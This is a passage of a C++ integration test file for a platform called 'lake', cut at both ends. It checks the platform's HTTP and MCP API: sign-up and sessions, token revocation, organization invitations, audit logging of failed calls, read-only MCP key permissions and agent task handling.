            "", "", "HTTP/1.1", credential);
        const std::string malformed = connection.request(
            "POST", "/v1/workspace_query", "[]", "", "HTTP/1.1", credential,
            "application/json");
        std::string app_list;
        if (task.agent == "agent-application") {
            app_list = connection.request(
                "GET", "/v1/list_apps?customer_id=" + task.customer_id,
                "", "", "HTTP/1.1", credential);
        }
        connection.workspace_id = selected_workspace;
        EXPECT_TRUE(zetta_openapi.starts_with("HTTP/1.1 200")) << zetta_openapi;
        EXPECT_TRUE(workspace_read.starts_with("HTTP/1.1 200")) << workspace_read;
        EXPECT_TRUE(malformed.starts_with("HTTP/1.1 400")) << malformed;
        if (task.agent == "agent-application") {
            EXPECT_TRUE(app_list.starts_with("HTTP/1.1 200")) << app_list;
        }
        ASSERT_TRUE(lake_openapi_response.starts_with("HTTP/1.1 200"))
            << lake_openapi_response;
        const nlohmann::json lake_openapi =
            nlohmann::json::parse(response_body(lake_openapi_response));
        const auto& parameters = lake_openapi["paths"]["/v1/list_apps"]["get"]["parameters"];
        const auto workspace_parameter =
            std::ranges::find_if(parameters, [](const nlohmann::json& parameter) {
                return parameter.value("name", std::string()) == "workspace_id";
            });
        ASSERT_NE(workspace_parameter, parameters.end());
        EXPECT_FALSE(workspace_parameter->value("required", true));
        const auto& required = lake_openapi["paths"]["/v1/workspace_query"]["post"]
                                           ["requestBody"]["content"]["application/json"]
                                           ["schema"]["required"];
        EXPECT_EQ(std::ranges::find(required, "workspace_id"), required.end());
    }

    // A library agent's part of a background turn (docs/api/agent-bus.md), done here through
    // lake's own capabilities with the agent service token: the task is received from the agent's
    // topic, claimed (its body arrives with the task's credential in place of "{{credential}}"),
    // handed to the scripted agent, and its answer published on agent-events. Lake's bus loop then
    // applies it. Answers the credential the agent was handed.
    std::string run_agent_task(HttpConnection& connection,
                              const std::string& task_id,
                              bool verify_workspace_inference = false) {
        const auto task = assembled_task(task_id);
        EXPECT_TRUE(task) << task_id;
        if (!task) {
            return {};
        }
        const auto call = [&](std::string_view method, const std::string& path,
                              const nlohmann::json& body) {
            const std::string response =
                connection.request(method, path, method == "GET" ? "" : body.dump(), "",
                                    "HTTP/1.1", "bus-token-" + task->agent, "application/json");
            const auto at = response.find("\r\n\r\n");
            return nlohmann::json::parse(
                at == std::string::npos ? std::string() : response.substr(at + 4), nullptr, false);
        };
        const std::string shared = connection.request(
            "GET", "/v1/receive_agent_tasks?agent=" + task->agent, "", "", "HTTP/1.1",
            "the-service-token");
        EXPECT_NE(shared.find("\"unauthorized\""), std::string::npos)
            << "the service token user-created agents also hold never reaches the bus: " << shared;
        const nlohmann::json inbox =
            call("GET", "/v1/receive_agent_tasks?agent=" + task->agent, nullptr);
        EXPECT_EQ(inbox["ok"], true) << inbox.dump();
        bool listed = false;
        for (const auto& row : inbox["value"]["tasks"]) {
            listed = listed || row["task_id"] == task_id;
        }
        EXPECT_TRUE(listed) << "the task is on " << task->agent << "'s topic: " << inbox.dump();
        const nlohmann::json claimed =
            call("POST", "/v1/claim_agent_task", {{"task_id", task_id}, {"agent", task->agent}});
        EXPECT_EQ(claimed["ok"], true) << claimed.dump();
        const nlohmann::json body = claimed["value"]["body"];
        const std::string credential = body.value("lake_token", std::string());
        agents_->turns.push_back(body);
        if (verify_workspace_inference) {
            verify_agent_workspace(connection, *task, credential);
        }
        const nlohmann::json progress =
            call("POST",
                 "/v1/publish_agent_event",
                 {{"task_id", task_id},
                  {"agent", task->agent},
                  {"type", "progress"},
                  {"message", "Working on the task"}});
        EXPECT_EQ(progress["ok"], true) << progress.dump();
        const auto running = assembled_task(task_id);
        EXPECT_TRUE(running);
        if (running) {
            EXPECT_EQ(running->phase, "Running");
            EXPECT_EQ(running->message, "Working on the task");
        }
        // The control store keeps no word of it: the message is in the workspace (lake#375).
        EXPECT_EQ(store_->get_agent_task(task_id)->message, "");
        const nlohmann::json published =
            call("POST",
                 "/v1/publish_agent_event",
                 {{"task_id", task_id},
                  {"agent", task->agent},
                  {"type", "result"},
                  {"result", agents_->answer}});
        EXPECT_EQ(published["ok"], true) << published.dump();
        const auto finished = assembled_task(task_id);
        EXPECT_TRUE(finished);
        if (finished) {
            EXPECT_EQ(finished->phase, "Succeeded");
        }
        EXPECT_TRUE(liquid::runtime::block_on(agent_bus_->pump(std::chrono::milliseconds(0))));
        return credential;
    }

    // The task as lake assembles it: the control store's dispatch row with the request, message
    // and answer read from its record in the workspace (lake#374, lake#375).
    std::optional<lake::control::AgentTask> assembled_task(const std::string& id) {
        auto found = store_->get_agent_task(id);
        if (!found) {
            return std::nullopt;
        }
        if (const auto content = lake::test::agent_task_content(workspaces_, *found, instance_kek_)) {
            found->body = content->request.is_object() ? content->request
                                                       : nlohmann::json::object();
            found->result = content->result;
            if (found->message.empty()) {
                found->message = content->message;
            }
        }
        return *found;
    }

    // A new identity's document and a proof of its key for a Lake-pool sign-up (lake#931).
    void create_identity_document() {
        lake::test::TestIdentity identity =
            lake::test::test_identity("response-identity-" + lake::control::new_uuid_v4());
        identity_document_ = identity.document;
        identity_proof_ = lake::test::prove_identity(*store_, "lake", identity);
    }

    // A sign-up body with the identity document, and its proof on PostgreSQL.
    std::string with_identity(nlohmann::json body) const {
        body["identity_document"] = identity_document_;
        if (std::get<0>(GetParam())) {
            body["identity_proof"] = lake::test::identity_proof_json(identity_proof_);
        }
        return body.dump();
    }

    std::unique_ptr<HttpConnection> connect() {
        auto connection = std::make_unique<HttpConnection>(server_->port());
        connection->workspace_id = selected_workspace_id_;
        return connection;
    }

    // Signs in with a password as the web app does: POST /v1/sign_in_password, which sets the
    // HttpOnly lake_session cookie. Answers that cookie, "lake_session=<secret>".
    std::string sign_in(HttpConnection& connection, const std::string& email = {}) {
        const std::string response =
            connection.request("POST",
                               "/v1/sign_in_password",
                               nlohmann::json{{"email", email.empty() ? email_ : email},
                                              {"password", password_},
                                              {"device_name", "browser"}}
                                   .dump(),
                               "",
                               "HTTP/1.1",
                               {},
                               "application/json");
        EXPECT_TRUE(response.starts_with("HTTP/1.1 200")) << response.substr(0, 300);
        return response_cookie_pair(response);
    }

    // A capability called as the web app calls it: the session cookie, a JSON body, from lake's
    // own origin. Answers the response and its parsed body.
    static std::pair<std::string, nlohmann::json> post_v1(HttpConnection& connection,
                                                          const std::string& cookie,
                                                          const std::string& name,
                                                          const nlohmann::json& input) {
        const std::string response =
            connection.request("POST",
                               "/v1/" + name,
                               input.dump(),
                               cookie,
                               "HTTP/1.1",
                               {},
                               "application/json",
                               {{"Origin", "http://localhost"}, {"Sec-Fetch-Site", "same-origin"}});
        return {response, nlohmann::json::parse(response_body(response), nullptr, false)};
    }

    // A read as the web app makes it: GET /v1/<name>?<query> with the session cookie.
    static nlohmann::json get_v1(HttpConnection& connection,
                                 const std::string& cookie,
                                 const std::string& name_and_query) {
        return nlohmann::json::parse(
            response_body(connection.request("GET", "/v1/" + name_and_query, "", cookie)),
            nullptr,
            false);
    }

    void select_workspace(HttpConnection& connection, const std::string& customer_id) {
        const auto requested = liquid::runtime::block_on(workspaces_->request(customer_id));
        ASSERT_TRUE(requested && *requested);
        connection.workspace_id = (*requested)->workspace_id;
        selected_workspace_id_ = connection.workspace_id;
        ready_service((*requested)->service_id);
    }

    // What the operator reports once a workspace's Zetta is up.
    void ready_service(const std::string& service_id) {
        const auto service = store_->get_service(service_id);
        ASSERT_TRUE(service);
        if (auto memory = std::dynamic_pointer_cast<lake::control::InMemoryStore>(store_)) {
            ASSERT_TRUE(memory->set_service_status(service->id, "Ready", "", "http://workspace.test"));
        } else {
            pqxx::connection database(database_uri_);
            pqxx::work tx(database);
            tx.exec_params("INSERT INTO service_status (service_id, phase, endpoint) "
                           "VALUES ($1::uuid, 'Ready', 'http://workspace.test') "
                           "ON CONFLICT (service_id) DO UPDATE SET phase = 'Ready', endpoint = 'http://workspace.test'",
                           service->id);
            tx.commit();
        }
        std::ofstream(workspace_dir_ / (service->slug + ".json")) << R"({"kind":"zetta","token":"t"})";
    }

    std::shared_ptr<lake::control::Store> store_;
    std::string selected_workspace_id_;
    std::shared_ptr<RecordingWorkspace> workspace_caller_ = std::make_shared<RecordingWorkspace>();
    std::shared_ptr<ScriptedAgents> agents_ = std::make_shared<ScriptedAgents>();
    std::shared_ptr<lake::control::MemoryAgentBus> bus_ =
        std::make_shared<lake::control::MemoryAgentBus>();
    std::shared_ptr<lake::control::AgentTaskBus> agent_bus_;
    std::shared_ptr<lake::control::WorkspaceService> workspaces_;
    std::filesystem::path workspace_dir_;
    std::unique_ptr<lake::api::ApiServer> server_;
    std::string database_uri_;
    std::string email_;
    std::string identity_document_;
    lake::control::IdentityProof identity_proof_;
    const std::string password_ = "correct horse battery staple";
    const std::string instance_kek_ =
        "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";
};

TEST_P(HttpResponseIsolation, FreshSignUpOwnsFirstRepositoryWithZeroInitialMetering) {
    if (std::get<0>(GetParam())) {
        create_identity_document();
    }
    const std::string email = "first-repository-" + lake::control::new_uuid_v4() + "@example.test";
    auto client = connect();
    // Signing up through the API sets the browser session, as the web app's form does.
    const std::string signup = client->request("POST",
                                               "/v1/sign_up_password",
                                               with_identity({{"email", email},
                                                              {"display_name", "Newcomer"},
                                                              {"password", password_},
                                                              {"device_name", "browser"}}),
                                               "",
                                               "HTTP/1.1",
                                               {},
                                               "application/json");
    ASSERT_TRUE(signup.starts_with("HTTP/1.1 200")) << signup;
    const std::string cookie = response_cookie_pair(signup);
    ASSERT_TRUE(cookie.starts_with("lake_session=")) << signup;
    const auto customers = get_v1(*client, cookie, "list_customers");
    ASSERT_TRUE(customers.at("ok"));
    ASSERT_EQ(customers.at("value").at("items").size(), 1U);
    const std::string customer_id = customers.at("value").at("items").at(0).at("id");
    const auto usage = get_v1(*client, cookie, "metering_usage?customer_id=" + customer_id);
    ASSERT_TRUE(usage.at("ok")) << usage.dump();
    EXPECT_EQ(usage.at("value").at("cost_micros"), 0);
    EXPECT_EQ(usage.at("value").at("quota_bytes"), 1ULL << 30);
    // No transfer and no builds yet: no hourly rows, and storage is measured live (lake#348).
    EXPECT_TRUE(usage.at("value").at("items").empty());
    EXPECT_EQ(usage.at("value").at("summary").at("storage").at("repositories_bytes"), 0);
    EXPECT_FALSE(usage.at("value").at("over_quota"));
    // A repository belongs to a workspace (lake#315): without one, none is created.
    const auto [early_response, early] = post_v1(
        *client,
        cookie,
        "create_repository",
        {{"customer_id", customer_id}, {"name", "no-workspace"}, {"visibility", "private"}});
    EXPECT_FALSE(early.value("ok", false)) << early_response;
    const auto workspace = store_->create_workspace({customer_id, "notes", "dev", ""});
    ASSERT_TRUE(workspace) << workspace.error().message;
    // The description is written to the workspace's Zetta (lake#315), so it must be Ready.
    ready_service(workspace->zetta_service_id);
    const auto [created_response, created] = post_v1(*client,
                                                     cookie,
                                                     "create_repository",
                                                     {{"customer_id", customer_id},
                                                      {"workspace_id", workspace->id},
                                                      {"name", "first-repository"},
                                                      {"description", "My files"},
                                                      {"visibility", "private"}});
    ASSERT_TRUE(created.value("ok", false)) << created_response;
    const std::string repository_id = created["value"]["id"];
    const auto repository = get_v1(*client, cookie, "get_repository?id=" + repository_id);
    ASSERT_TRUE(repository.value("ok", false)) << repository.dump();
    EXPECT_EQ(repository["value"]["name"], "first-repository");
    EXPECT_EQ(repository["value"]["description"], "My files")
        << "the description, from the workspace";
    const auto [denied_response, denied] = post_v1(*client,
                                                   "lake_session=invalid",
                                                   "create_repository",
                                                   {{"customer_id", customer_id},
                                                    {"workspace_id", workspace->id},
                                                    {"name", "forbidden"},
                                                    {"visibility", "private"}});
    EXPECT_TRUE(denied_response.starts_with("HTTP/1.1 401")) << denied_response;
    EXPECT_EQ(store_->list_repositories(customer_id, 10)->size(), 1U);
}

namespace {

nlohmann::json response_json(const std::string& response) {
    return nlohmann::json::parse(response.substr(response.find("\r\n\r\n") + 4));
}

} // namespace

TEST_P(HttpResponseIsolation, PersonCreatesAnOrganizationInvitesAndAColleagueJoins) {
    auto client = connect();
    const std::string owner = sign_in(*client);
    const std::string handle = "acme-" + lake::control::new_uuid_v4().substr(0, 8);
    const auto [created_response, created] =
        post_v1(*client,
                owner,
                "create_organization_space",
                {{"display_name", "Acme Research"}, {"name", handle}});
    ASSERT_TRUE(created.value("ok", false)) << created_response;
    const std::string organization_id = created["value"]["organization"]["id"];
    const auto owned = get_v1(*client, owner, "list_memberships");
    ASSERT_TRUE(owned.at("ok")) << owned.dump();
    ASSERT_EQ(owned.at("value").at("items").size(), 1U);
    EXPECT_EQ(owned.at("value").at("items").at(0).at("role"), "owner");

    if (std::get<0>(GetParam())) {
        create_identity_document();
    }
    const std::string colleague_email =
        "colleague-" + lake::control::new_uuid_v4() + "@example.test";
    const std::string signup = client->request("POST",
                                               "/v1/sign_up_password",
                                               with_identity({{"email", colleague_email},
                                                              {"display_name", "Colleague"},
                                                              {"password", password_},
                                                              {"device_name", "browser"}}),
                                               "",
                                               "HTTP/1.1",
                                               {},
                                               "application/json");
    ASSERT_TRUE(signup.starts_with("HTTP/1.1 200")) << signup;
    const std::string colleague = response_cookie_pair(signup);

    const std::string expires_at =
        std::format("{:%FT%TZ}",
                    std::chrono::floor<std::chrono::seconds>(std::chrono::system_clock::now() +
                                                             std::chrono::days{7}));
    const auto [invited_response, invited] = post_v1(*client,
                                                     owner,
                                                     "create_invitation",
                                                     {{"organization_id", organization_id},
                                                      {"invitee_type", "email"},
                                                      {"invitee", colleague_email},
                                                      {"role", "admin"},
                                                      {"expires_at", expires_at}});
    ASSERT_TRUE(invited.value("ok", false)) << invited_response;

    const auto invitations = get_v1(*client, colleague, "list_invitations");
    ASSERT_TRUE(invitations.at("ok")) << invitations.dump();
    ASSERT_EQ(invitations.at("value").at("items").size(), 1U);
    const std::string invitation_id = invitations.at("value").at("items").at(0).at("id");
    EXPECT_EQ(invitations.at("value").at("items").at(0).at("organization_name"), "Acme Research");

    const auto [accepted_response, accepted] =
        post_v1(*client, colleague, "join_organization", {{"invitation_id", invitation_id}});
    ASSERT_TRUE(accepted.value("ok", false)) << accepted_response;
    EXPECT_EQ(accepted["value"]["organization_id"], organization_id);
    const auto memberships = get_v1(*client, colleague, "list_memberships");
    ASSERT_TRUE(memberships.at("ok")) << memberships.dump();
    ASSERT_EQ(memberships.at("value").at("items").size(), 1U);
    EXPECT_EQ(memberships.at("value").at("items").at(0).at("role"), "admin");
    const auto spaces = get_v1(*client, colleague, "list_customers");
    ASSERT_TRUE(spaces.at("ok"));
    bool organization_space = false;
    for (const auto& space : spaces.at("value").at("items")) {
        organization_space = organization_space || space.at("name") == handle;
    }
    EXPECT_TRUE(organization_space) << spaces.dump();
}

TEST_P(HttpResponseIsolation, PersonalSpaceBecomesAnOrganization) {
    auto client = connect();
    const std::string cookie = sign_in(*client);
    const auto before = get_v1(*client, cookie, "list_customers");
    ASSERT_TRUE(before.at("ok"));
    ASSERT_EQ(before.at("value").at("items").size(), 1U);
    const std::string customer_id = before.at("value").at("items").at(0).at("id");
    const std::string handle = before.at("value").at("items").at(0).at("name");

    const auto [converted_response, converted] =
        post_v1(*client,
                cookie,
                "convert_personal_space",
                {{"customer_id", customer_id}, {"display_name", "Solo Labs"}});
    ASSERT_TRUE(converted.value("ok", false)) << converted_response;
    const std::string organization_id = converted["value"]["organization"]["id"];
    const auto after = get_v1(*client, cookie, "get_customer?customer_id=" + customer_id);
    ASSERT_TRUE(after.at("ok")) << after.dump();
    EXPECT_EQ(after.at("value").at("customer_type"), "organization");
    EXPECT_EQ(after.at("value").at("name"), handle);
    const auto spaces = get_v1(*client, cookie, "list_customers");
    ASSERT_TRUE(spaces.at("ok"));
    EXPECT_EQ(spaces.at("value").at("items").size(), 2U) << spaces.dump();
    const auto memberships = get_v1(*client, cookie, "list_memberships");
    ASSERT_TRUE(memberships.at("ok")) << memberships.dump();
    ASSERT_EQ(memberships.at("value").at("items").size(), 1U);
    EXPECT_EQ(memberships.at("value").at("items").at(0).at("role"), "owner");
    const auto organization = get_v1(*client, cookie, "get_organization?id=" + organization_id);
    ASSERT_TRUE(organization.value("ok", false)) << organization.dump();
    EXPECT_EQ(organization["value"]["display_name"], "Solo Labs");
}

TEST_P(HttpResponseIsolation, SignOutEndsTheSessionOnTheServer) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    ASSERT_TRUE(
        connection->request("GET", "/v1/list_sessions", {}, cookie).starts_with("HTTP/1.1 200"));
    const std::string signed_out = connection->request("POST", "/logout", {}, cookie);
    ASSERT_TRUE(signed_out.starts_with("HTTP/1.1 302"));
    EXPECT_EQ(response_header(signed_out, "location"), "/");
    EXPECT_NE(response_header(signed_out, "set-cookie").find("Max-Age=0"), std::string::npos);
    // The same cookie, replayed after sign-out, no longer authenticates.
    const std::string replayed = connection->request("GET", "/v1/list_sessions", {}, cookie);
    EXPECT_TRUE(replayed.starts_with("HTTP/1.1 401")) << replayed;
}

TEST_P(HttpResponseIsolation, ATokenIsIssuedAndRevokedWithTheBrowserSession) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    // No lifetime asked for: the token lasts as long as the session allows (#193).
    const auto [created_response, created] =
        post_v1(*connection,
                cookie,
                "create_token",
                {{"name", "revoke-me"}, {"scopes", {"list_sessions"}}});
    ASSERT_TRUE(created.value("ok", false)) << created_response.substr(0, 300);
    const std::string token = created["value"]["secret"];
    ASSERT_FALSE(token.empty());
    const std::string listed =
        connection->request("GET", "/v1/list_sessions", {}, "lake_session=" + token);
    ASSERT_TRUE(listed.starts_with("HTTP/1.1 200")) << listed.substr(0, 300);
    const auto sessions = nlohmann::json::parse(response_body(listed));
    std::string id;
    for (const auto& session : sessions.at("value").at("items")) {
        if (session.value("name", "") == "revoke-me") {
            id = session.at("id");
        }
    }
    ASSERT_FALSE(id.empty());
    const auto [revoked_response, revoked] =
        post_v1(*connection, cookie, "revoke_session", {{"id", id}});
    EXPECT_TRUE(revoked.value("ok", false)) << revoked_response.substr(0, 300);
    const std::string after =
        connection->request("GET", "/v1/list_sessions", {}, "lake_session=" + token);
    EXPECT_FALSE(after.starts_with("HTTP/1.1 200")) << "a revoked token no longer authenticates";
}

// lake#18: every call to a capability route is audited, a body lake cannot read included. A
// malformed body and a well-formed one each leave exactly one signed failure event under their
// request id, with the error and the body's size but never its contents.
TEST_P(HttpResponseIsolation, AMalformedBodyIsAuditedLikeAnyFailedCall) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string secret = "body-canary-" + lake::control::new_uuid_v4();
    const auto post =
        [&](const std::string& path, const std::string& body, const std::string& request_id) {
            return connection->request("POST",
                                       path,
                                       body,
                                       cookie,
                                       "HTTP/1.1",
                                       {},
                                       "application/json",
                                       {{"Origin", "http://localhost"},
                                        {"Sec-Fetch-Site", "same-origin"},
                                        {"X-Request-Id", request_id}});
        };
    const std::string suffix = lake::control::new_uuid_v4();
    struct Case {
        std::string request_id, body;
    };
    for (const Case& sent : {Case{"valid-json-" + suffix, "{}"},
                             Case{"malformed-json-" + suffix, "{\"name\":\"" + secret},
                             Case{"not-an-object-" + suffix, "[\"" + secret + "\"]"}}) {
        const std::string response = post("/v1/create_token", sent.body, sent.request_id);
        EXPECT_TRUE(response.starts_with("HTTP/1.1 400")) << response.substr(0, 300);
        const auto events = store_->list_audit_events({.request_id = sent.request_id});
        ASSERT_TRUE(events) << events.error().message;
        ASSERT_EQ(events->size(), 1U) << sent.request_id;
        const lake::audit::Event& event = events->front();
        EXPECT_EQ(event.draft.action, "create_token");
        EXPECT_EQ(event.draft.outcome, "failure");
        EXPECT_FALSE(event.draft.principal.empty());
        EXPECT_NE(event.draft.principal, "anonymous") << "the signed-in person is named";
        EXPECT_EQ(event.draft.details.value("error_code", ""), "invalid_input");
        EXPECT_FALSE(event.signature.empty());
        EXPECT_EQ(lake::audit::to_json(event).dump().find(secret), std::string::npos)
            << "the body never reaches the audit";
    }
    const auto malformed = store_->list_audit_events({.request_id = "malformed-json-" + suffix});
    ASSERT_TRUE(malformed);
    ASSERT_EQ(malformed->size(), 1U);
    EXPECT_EQ(malformed->front().draft.details.value("input", ""), "not_json");
    EXPECT_EQ(malformed->front().draft.details.value("body_bytes", 0),
              static_cast<int>(std::string("{\"name\":\"").size() + secret.size()));

    // An unauthenticated caller is refused and audited before its malformed body is read.
    const std::string anonymous_id = "anonymous-malformed-" + suffix;
    const std::string anonymous = connection->request("POST",
                                                      "/v1/create_token",
                                                      "{",
                                                      "",
                                                      "HTTP/1.1",
                                                      {},
                                                      "application/json",
                                                      {{"X-Request-Id", anonymous_id}});
    EXPECT_TRUE(anonymous.starts_with("HTTP/1.1 401")) << anonymous.substr(0, 300);
    const auto anonymous_events = store_->list_audit_events({.request_id = anonymous_id});
    ASSERT_TRUE(anonymous_events);
    ASSERT_EQ(anonymous_events->size(), 1U);
    EXPECT_EQ(anonymous_events->front().draft.principal, "anonymous");
    EXPECT_EQ(anonymous_events->front().draft.details.value("error_code", ""), "unauthenticated");
    EXPECT_EQ(anonymous_events->front().draft.details.value("input", ""), "unread");
    EXPECT_EQ(anonymous_events->front().draft.details.value("body_bytes", -1), 0);

    // Audit verification still holds after the refusals were signed in.
    const auto all = lake::test::audit_events(*store_);
    ASSERT_TRUE(all) << all.error().message;
    EXPECT_TRUE(lake::audit::verify(*store_, *all));
}

// lake#18: the administrator of an account reads its audit over REST and MCP; the whole instance's
// log stays the operator's.
TEST_P(HttpResponseIsolation, AnAccountAdministratorReadsItsAuditOverRestAndMcp) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const auto customers = get_v1(*connection, cookie, "list_customers");
    ASSERT_TRUE(customers.at("ok")) << customers.dump();
    ASSERT_FALSE(customers.at("value").at("items").empty());
    const std::string customer_id = customers.at("value").at("items").at(0).at("id");

    const auto own = get_v1(*connection, cookie, "audit?limit=50&customer_id=" + customer_id);
    ASSERT_TRUE(own.value("ok", false)) << own.dump();
    for (const auto& event : own.at("value").at("items")) {
        if (event.value("log", "") == "central") {
            EXPECT_EQ(event.value("customer_id", nlohmann::json()), customer_id) << event.dump();
        }
    }
    const auto exported =
        get_v1(*connection, cookie, "export_audit?limit=50&customer_id=" + customer_id);
    EXPECT_TRUE(exported.value("ok", false)) << exported.dump();
    const std::string whole = connection->request("GET", "/v1/audit?limit=2", "", cookie);
    EXPECT_TRUE(whole.starts_with("HTTP/1.1 403")) << whole.substr(0, 300);
    const std::string other = connection->request(
        "GET", "/v1/audit?limit=2&customer_id=" + lake::control::new_uuid_v4(), "", cookie);
    EXPECT_TRUE(other.starts_with("HTTP/1.1 403")) << other.substr(0, 300);

    const auto [created_response, created] =
        post_v1(*connection, cookie, "create_token", {{"name", "auditor"}, {"scopes", {"*"}}});
    ASSERT_TRUE(created.value("ok", false)) << created_response.substr(0, 300);
    const std::string key = created["value"]["secret"];
    const std::string mcp = connection->request(
        "POST",
        "/mcp",
        nlohmann::json{
            {"jsonrpc", "2.0"},
            {"id", 1},
            {"method", "tools/call"},
            {"params",
             {{"name", "audit"}, {"arguments", {{"limit", 10}, {"customer_id", customer_id}}}}}}
            .dump(),
        "",
        "HTTP/1.1",
        key,
        "application/json");
    EXPECT_NE(mcp.find("\"isError\":false"), std::string::npos) << mcp.substr(0, 600);
}

// Developer → MCP (docs/api/mcp.md): llms.txt is public and names every tool; a read-only MCP key
// made as the web app makes it (create_token with mcp_setup's read-only scopes) lists tools over
// /mcp, may read and may not write; the skill downloads.
TEST_P(HttpResponseIsolation, AnMcpKeyWorksOverMcp) {
    auto connection = connect();
    const std::string llms = connection->request("GET", "/llms.txt");
    ASSERT_TRUE(llms.starts_with("HTTP/1.1 200")) << llms.substr(0, 300);
    EXPECT_NE(llms.find("http://localhost/mcp"), std::string::npos);
    EXPECT_NE(llms.find("`create_pipeline` (write)"), std::string::npos);
    // A tool called with the wrong method says which method to use (lake#256).
    const std::string wrong = connection->request("GET", "/v1/create_pipeline");
    EXPECT_TRUE(wrong.starts_with("HTTP/1.1 405")) << wrong.substr(0, 200);
    EXPECT_NE(wrong.find("call it with POST"), std::string::npos);
    // The Docs guides are public, read through the API (lake#252).
    const auto docs = get_v1(*connection, "", "get_doc?page=train");
    ASSERT_TRUE(docs.value("ok", false)) << docs.dump();
    EXPECT_EQ(docs["value"]["slug"], "train");
    EXPECT_TRUE(connection->request("GET", "/v1/get_doc?page=nope").starts_with("HTTP/1.1 404"));
    const std::string full = response_body(connection->request("GET", "/llms-full.txt"));

    const std::string cookie = sign_in(*connection);
    const auto setup = get_v1(*connection, cookie, "mcp_setup");
    ASSERT_TRUE(setup.value("ok", false)) << setup.dump();
    EXPECT_EQ(setup["value"]["mcp_url"], "http://localhost/mcp");
    const auto [created_response, created] =
        post_v1(*connection,
                cookie,
                "create_token",
                {{"name", "MCP key (read-only)"},
                 {"scopes", setup["value"]["scopes"]["read_only"]},
                 {"static", false},
                 {"reason", "created on Developer → MCP"}});
    ASSERT_TRUE(created.value("ok", false)) << created_response.substr(0, 300);
    const std::string key = created["value"]["secret"];

    // An MCP client presents the key as its bearer, with a JSON body.
    const std::string tools =
        connection->request("POST",
                            "/mcp",
                            R"({"jsonrpc":"2.0","id":1,"method":"tools/list"})",
                            "",
                            "HTTP/1.1",
                            key,
                            "application/json");
    ASSERT_TRUE(tools.starts_with("HTTP/1.1 200")) << tools.substr(0, 300);
    EXPECT_NE(tools.find("\"server_info\""), std::string::npos);
    // llms-full.txt documents every MCP tool.
    const auto listed = nlohmann::json::parse(response_body(tools));
    for (const auto& tool : listed.at("result").at("tools")) {
        const std::string name = tool.at("name");
        EXPECT_NE(full.find("### `" + name + "`"), std::string::npos) << name;
    }
    const std::string read = connection->request(
        "POST",
        "/mcp",
        R"({"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"list_sessions","arguments":{}}})",
        "",
        "HTTP/1.1",
        key,
        "application/json");
    EXPECT_NE(read.find("\"isError\":false"), std::string::npos) << read.substr(0, 600);
    const std::string write = connection->request(
        "POST",
        "/mcp",
        R"({"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"create_token","arguments":{"name":"x","scopes":["*"]}}})",
        "",
        "HTTP/1.1",
        key,
        "application/json");
    EXPECT_NE(write.find("credential does not grant create_token"), std::string::npos)
        << write.substr(0, 600);

    // The skill is linked from llms.txt and downloads with no credential.
    EXPECT_NE(llms.find("(http://localhost/skills/lake/SKILL.md)"), std::string::npos);
    const std::string skill = connection->request("GET", "/skills/lake/SKILL.md");
    ASSERT_TRUE(skill.starts_with("HTTP/1.1 200")) << skill.substr(0, 200);
    EXPECT_EQ(response_header(skill, "content-disposition"), "attachment; filename=SKILL.md");
    EXPECT_NE(skill.find("name: lake"), std::string::npos);
    EXPECT_NE(skill.find("approve_pipeline"), std::string::npos);
    const std::string developer = connection->request("GET", "/developer/mcp/skill");
    EXPECT_TRUE(developer.starts_with("HTTP/1.1 200")) << developer.substr(0, 200);
}

TEST_P(HttpResponseIsolation, SignInCannotAuthenticateAnotherClient) {
    for (const std::string_view path : {"/v1/viewer", "/v1/server_info", "/v1/openapi.json"}) {
        SCOPED_TRACE(path);
        auto connection = connect();
        const std::string sign_in = connection->request(
            "POST",
            "/v1/sign_in_password",
            nlohmann::json{{"email", email_}, {"password", password_}, {"device_name", "browser"}}
                .dump(),
            "",
            "HTTP/1.1",
            {},
            "application/json");
        ASSERT_TRUE(sign_in.starts_with("HTTP/1.1 200")) << sign_in;
        const std::string issued = response_header(sign_in, "set-cookie");
        ASSERT_TRUE(issued.starts_with("lake_session="));
        ASSERT_TRUE(issued.contains("HttpOnly"));
        const std::string client_a_cookie = issued.substr(0, issued.find(';'));
        if (std::get<1>(GetParam())) {
            connection.reset();
            connection = connect();
        }

        // Client B sends no credentials and adopts only cookies it actually receives.
        const std::string public_read = connection->request("GET", std::string(path));
        ASSERT_TRUE(public_read.starts_with("HTTP/1.1 200"));
        EXPECT_TRUE(response_header(public_read, "location").empty());
        const std::string received = response_header(public_read, "set-cookie");
        EXPECT_TRUE(received.empty()) << "Anonymous response received a cookie [REDACTED]";
        const std::string client_b_cookie = received.substr(0, received.find(';'));
        const std::string denied =
            connection->request("GET", "/v1/list_sessions", {}, client_b_cookie);
        EXPECT_TRUE(denied.starts_with("HTTP/1.1 401")) << denied;
        EXPECT_TRUE(response_header(denied, "set-cookie").empty());

        // A still owns its valid session; B cannot acquire it from A's next response either.
        const std::string allowed =
            connection->request("GET", "/v1/list_sessions", {}, client_a_cookie);
        EXPECT_TRUE(allowed.starts_with("HTTP/1.1 200"));
        EXPECT_TRUE(response_header(allowed, "set-cookie").empty());
        const std::string anonymous =
            connection->request("GET", std::string(path), {}, client_b_cookie);
        EXPECT_TRUE(anonymous.starts_with("HTTP/1.1 200"));
        EXPECT_TRUE(response_header(anonymous, "set-cookie").empty());
    }
}

// lake#534: a real long poll over REST gives its HTTP worker back (counted once in
// lake_http_long_requests_total); the same capability without a wait keeps it.
TEST_P(HttpResponseIsolation, ALongPollOverRestGivesItsWorkerBack) {
    HttpConnection connection(server_->port());
    const auto long_requests = [&]() -> std::string {
        const std::string metrics = connection.request("GET", "/metrics", "", "", "HTTP/1.1",
                                                       "front-door-operator");
        const auto at = metrics.find("\nlake_http_long_requests_total ");
        return at == std::string::npos
                   ? std::string("0")
                   : metrics.substr(at + 31, metrics.find('\n', at + 1) - at - 31);
    };
    EXPECT_EQ(long_requests(), "0");
    const std::string immediate = connection.request(
        "GET", "/v1/receive_agent_tasks?agent=agent-project&wait_ms=0", "", "", "HTTP/1.1",
        "bus-token-agent-project");
    ASSERT_TRUE(immediate.starts_with("HTTP/1.1 200")) << immediate;
    EXPECT_EQ(long_requests(), "0");
    const std::string parked = connection.request(
